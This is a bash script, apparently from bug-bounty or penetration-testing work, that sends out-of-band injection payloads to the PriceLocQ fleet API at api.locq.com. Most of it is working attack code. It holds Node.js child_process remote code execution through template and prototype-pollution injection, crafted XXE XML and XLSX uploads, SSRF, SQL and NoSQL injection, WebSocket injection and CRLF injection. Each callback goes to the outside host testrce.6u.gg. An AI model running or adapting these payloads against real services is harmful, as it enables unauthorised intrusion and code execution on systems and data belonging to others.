#!/bin/bash
# OOB Callback Tests — PriceLocQ (business.pricelocq.com)
# Domain: testrce.6u.gg
# Run from local machine with valid JWT token
#
# Monitor callbacks: check your 6u.gg dashboard for hits
# Each payload uses a unique path so you know WHICH test triggered

API="https://api.locq.com"
OOB="testrce.6u.gg"
# Paste your JWT here (grab from localStorage -> accessToken after login)
TOKEN="YOUR_JWT_HERE"
FLEET_ID="YOUR_FLEET_ID"

H1="Authorization: $TOKEN"
H2="Content-Type: application/json"

echo "=== OOB RCE/SSRF/SSTI Tests ==="
echo "Monitor $OOB for callbacks"
echo ""

# ─────────────────────────────────────────────────────────────
# TEST 1: Report Generation — Lodash _.template() SSTI
# The report endpoint uses _.template() which compiles strings
# into executable JS. If user input reaches template interpolation
# we get RCE.
# ─────────────────────────────────────────────────────────────

echo "[TEST 1a] Report Gen - SSTI via report name/params"
curl -sk "$API/ms-fleet/report/v3" \
  -H "$H1" -H "$H2" \
  -d "{
    \"fleetId\": \"$FLEET_ID\",
    \"reportName\": \"\${require('child_process').exec('curl http://$OOB/rce-report-name')}\",
    \"startDate\": \"2024-01-01\",
    \"endDate\": \"2024-12-31\",
    \"type\": \"fuel-consumption\"
  }" -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 1b] Report Gen - SSTI via connectionId"
curl -sk "$API/ms-fleet/report/v3" \
  -H "$H1" -H "$H2" \
  -d "{
    \"fleetId\": \"$FLEET_ID\",
    \"connectionId\": \"\${require('child_process').exec('curl http://$OOB/rce-connid')}\",
    \"type\": \"fuel-consumption\",
    \"startDate\": \"2024-01-01\",
    \"endDate\": \"2024-12-31\"
  }" -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 1c] ms-report endpoint - SSTI via report fields"
curl -sk "$API/ms-report/report" \
  -H "$H1" -H "$H2" \
  -d "{
    \"fleetId\": \"$FLEET_ID\",
    \"name\": \"{{constructor.constructor('return require(\\\"child_process\\\").exec(\\\"curl http://$OOB/rce-msreport\\\")')()}}\",
    \"type\": \"transactions\"
  }" -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 1d] Report - Node.js proto pollution + template"
curl -sk "$API/ms-fleet/report/v3" \
  -H "$H1" -H "$H2" \
  -d "{
    \"fleetId\": \"$FLEET_ID\",
    \"__proto__\": {\"sourceURL\": \"\\nreturn require('child_process').exec('curl http://$OOB/rce-proto')\"},
    \"type\": \"fuel-consumption\",
    \"startDate\": \"2024-01-01\",
    \"endDate\": \"2024-12-31\"
  }" -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 1e] Report - Lodash template escape chars"
curl -sk "$API/ms-fleet/report/v3" \
  -H "$H1" -H "$H2" \
  -d "{
    \"fleetId\": \"$FLEET_ID\",
    \"reportName\": \"<%- global.process.mainModule.require('child_process').execSync('curl http://$OOB/rce-lodash-esc') %>\",
    \"startDate\": \"2024-01-01\",
    \"endDate\": \"2024-12-31\",
    \"type\": \"fuel-consumption\"
  }" -o /dev/null -w "HTTP %{http_code}\n"

# ─────────────────────────────────────────────────────────────
# TEST 2: Driver Batch Import — XXE via file upload
# ms-fleet/driver/batch accepts multipart/form-data
# If server parses XML/XLSX with external entities enabled = XXE
# ─────────────────────────────────────────────────────────────

echo ""
echo "[TEST 2a] Driver Batch Import - XXE via CSV with XML header"

# Create malicious CSV-like file with XXE
cat > /tmp/xxe-drivers.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://testrce.6u.gg/xxe-driver-batch">
]>
<drivers>
  <driver>
    <name>&xxe;</name>
    <email>test@test.com</email>
  </driver>
</drivers>
XMLEOF

curl -sk "$API/ms-fleet/driver/batch" \
  -H "Authorization: $TOKEN" \
  -F "fleetId=$FLEET_ID" \
  -F "file=@/tmp/xxe-drivers.xml;type=text/xml" \
  -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 2b] Driver Batch Import - XXE via XLSX (crafted)"
# XLSX is a zip of XML files — if they parse it, XXE may work
# Create minimal malicious xlsx-like payload
mkdir -p /tmp/xxe-xlsx/xl
cat > /tmp/xxe-xlsx/\[Content_Types\].xml << 'CT'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://testrce.6u.gg/xxe-xlsx-ct">]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="xml" ContentType="application/xml"/>&xxe;
</Types>
CT
cat > /tmp/xxe-xlsx/xl/sharedStrings.xml << 'SS'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://testrce.6u.gg/xxe-xlsx-ss">]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<si><t>&xxe;</t></si>
</sst>
SS
cd /tmp/xxe-xlsx && zip -r /tmp/xxe-drivers.xlsx . 2>/dev/null && cd -

curl -sk "$API/ms-fleet/driver/batch" \
  -H "Authorization: $TOKEN" \
  -F "fleetId=$FLEET_ID" \
  -F "file=@/tmp/xxe-drivers.xlsx;type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" \
  -o /dev/null -w "HTTP %{http_code}\n"

# ─────────────────────────────────────────────────────────────
# TEST 3: SSRF — URL injection in various parameters
# ─────────────────────────────────────────────────────────────

echo ""
echo "[TEST 3a] SSRF via profile image/avatar URL"
curl -sk "$API/ms-profile/user" \
  -X PUT \
  -H "$H1" -H "$H2" \
  -d "{
    \"avatar\": \"http://$OOB/ssrf-avatar\",
    \"profileImage\": \"http://$OOB/ssrf-profile-img\"
  }" -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 3b] SSRF via webhook/callback URL if supported"
curl -sk "$API/ms-fleet/fleet" \
  -X PUT \
  -H "$H1" -H "$H2" \
  -d "{
    \"fleetId\": \"$FLEET_ID\",
    \"webhookUrl\": \"http://$OOB/ssrf-webhook\",
    \"callbackUrl\": \"http://$OOB/ssrf-callback\"
  }" -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 3c] SSRF via PayMaya/payment redirect"
curl -sk "$API/ms-fleet/cashin" \
  -H "$H1" -H "$H2" \
  -d "{
    \"fleetId\": \"$FLEET_ID\",
    \"amount\": 1,
    \"redirectUrl\": \"http://$OOB/ssrf-cashin-redirect\",
    \"callbackUrl\": \"http://$OOB/ssrf-cashin-callback\"
  }" -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 3d] SSRF via virtual station config"
curl -sk "$API/ms-fleet/virtual-station" \
  -X POST \
  -H "$H1" -H "$H2" \
  -d "{
    \"fleetId\": \"$FLEET_ID\",
    \"name\": \"test\",
    \"imageUrl\": \"http://$OOB/ssrf-vstation\"
  }" -o /dev/null -w "HTTP %{http_code}\n"

# ─────────────────────────────────────────────────────────────
# TEST 4: Blind SQLi with OOB DNS exfil
# Targeting listing/search endpoints that likely hit a DB
# ─────────────────────────────────────────────────────────────

echo ""
echo "[TEST 4a] SQLi OOB - Driver search/filter"
curl -sk "$API/ms-fleet/driver/fleet/$FLEET_ID?search=1'%20OR%201=1;EXEC%20master..xp_dirtree%20'\\\\$OOB\\sqli-driver'--" \
  -H "$H1" -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 4b] SQLi OOB - Driver search (MySQL LOAD_FILE)"
curl -sk "$API/ms-fleet/driver/fleet/$FLEET_ID?search=1'%20UNION%20SELECT%20LOAD_FILE(CONCAT('\\\\\\\\','sqli.',SUBSTRING(version(),1,5),'.$OOB\\\\a'))--" \
  -H "$H1" -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 4c] SQLi OOB - Fuel code listing"
curl -sk "$API/ms-fleet/fuel-code?fleetId=$FLEET_ID&status=1'%20OR%201=1;SELECT%20UTL_HTTP.REQUEST('http://$OOB/sqli-fuelcode')%20FROM%20DUAL--" \
  -H "$H1" -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 4d] SQLi Time-based blind - Users endpoint"
curl -sk "$API/ms-profile/user/users?fleetId=$FLEET_ID&search=admin'%20AND%20SLEEP(5)--" \
  -H "$H1" -o /dev/null -w "HTTP %{http_code} (check if >5s = vuln)\n" --max-time 10

echo "[TEST 4e] SQLi Time-based blind - Redemption"
curl -sk "$API/ms-fleet/redemption?fleetId=$FLEET_ID&search=test'%20AND%20(SELECT%20SLEEP(5))--" \
  -H "$H1" -o /dev/null -w "HTTP %{http_code} (check if >5s = vuln)\n" --max-time 10

echo "[TEST 4f] SQLi - Vehicle listing"
curl -sk "$API/ms-fleet/vehicle/fleet/$FLEET_ID?search=1'%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL--" \
  -H "$H1" -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 4g] NoSQLi - MongoDB injection on driver search"
curl -sk "$API/ms-fleet/driver/fleet/$FLEET_ID" \
  -H "$H1" -H "$H2" \
  -G --data-urlencode 'search[$regex]=.*' \
  -o /dev/null -w "HTTP %{http_code}\n"

echo "[TEST 4h] NoSQLi - User lookup"
curl -sk "$API/ms-profile/user/users" \
  -H "$H1" -H "$H2" \
  -G --data-urlencode "fleetId=$FLEET_ID" \
  --data-urlencode 'email[$ne]=null' \
  -o /dev/null -w "HTTP %{http_code}\n"

# ─────────────────────────────────────────────────────────────
# TEST 5: WebSocket injection (wss://pd3wolnhxa.execute-api...)
# The report generation uses WebSocket for real-time updates
# connectionId flows through the system
# ─────────────────────────────────────────────────────────────

echo ""
echo "[TEST 5] WebSocket SSTI via connectionId"
echo "Manual test: connect to wss://pd3wolnhxa.execute-api.ap-southeast-1.amazonaws.com/prod"
echo "Send: {\"action\":\"message\",\"data\":\"\${require('child_process').exec('curl http://$OOB/ws-rce')}\"}"
echo ""

# ─────────────────────────────────────────────────────────────
# TEST 6: Header injection / CRLF
# ─────────────────────────────────────────────────────────────

echo "[TEST 6] CRLF injection in redirect params"
curl -sk "$API/ms-fleet/cashin" \
  -H "$H1" -H "$H2" \
  -d "{
    \"fleetId\": \"$FLEET_ID\",
    \"amount\": 1,
    \"redirectUrl\": \"http://legit.com%0d%0aX-Injected: http://$OOB/crlf-test\"
  }" -o /dev/null -w "HTTP %{http_code}\n"

echo ""
echo "=== Done. Check $OOB dashboard for callbacks ==="
echo "Any callback = confirmed vulnerability"
echo ""
echo "Priority hits to watch for:"
echo "  /rce-*        = Remote Code Execution (P1)"
echo "  /xxe-*        = XML External Entity (P1-P2)"
echo "  /ssrf-*       = Server-Side Request Forgery (P2)"
echo "  /sqli-*       = SQL Injection OOB (P1)"
echo "  /ws-rce       = WebSocket RCE (P1)"
